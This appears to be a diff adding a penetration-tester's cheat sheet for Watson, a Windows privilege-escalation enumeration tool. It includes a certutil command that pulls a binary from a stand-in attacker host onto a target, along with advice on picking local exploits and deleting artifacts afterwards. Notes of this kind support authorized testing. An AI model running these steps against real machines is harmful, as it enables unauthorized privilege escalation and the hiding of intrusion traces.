@@ -1,0 +1,47 @@
+# ================= Watson =================
+# Description:
+# Watson is a .NET-based tool that helps identify privilege escalation vectors
+# on Windows systems by checking for missing patches, vulnerable configurations,
+# and exploitable CVEs.
+
+# Repository:
+# https://github.com/rasta-mouse/Watson
+
+# ---------------- SETUP ----------------
+# 1. Clone the repository (on your attack machine):
+git clone https://github.com/rasta-mouse/Watson.git
+cd Watson
+
+# 2. Build with Visual Studio (C# project) or download the precompiled binary
+
+# 3. Transfer the binary to the target Windows machine
+# Example using certutil:
+certutil -urlcache -f http://attacker.com/watson.exe watson.exe
+
+# ---------------- USAGE ----------------
+# Run the Watson binary (basic usage):
+watson.exe
+
+# Run with verbose output:
+watson.exe -v
+
+# Redirect output to file for later analysis:
+watson.exe > results.txt
+
+# ---------------- FEATURES ----------------
+# - Detects missing patches for privilege escalation CVEs
+# - Identifies vulnerable Windows builds (e.g., Token handling, UAC bypass)
+# - Suggests applicable local exploits
+
+# ---------------- INTERPRETING OUTPUT ----------------
+# - "Potentially Vulnerable" section shows what CVEs are applicable
+# - Useful for choosing a targeted LPE exploit (e.g., JuicyPotato, CVE-2019-1388)
+
+# ---------------- TIPS ----------------
+# - Best run under a low-privileged user
+# - Combine with tools like SharpUp or winPEAS for thorough coverage
+# - Works best on older or unpatched Windows systems
+
+# ---------------- CLEANUP ----------------
+del watson.exe
+del results.txt
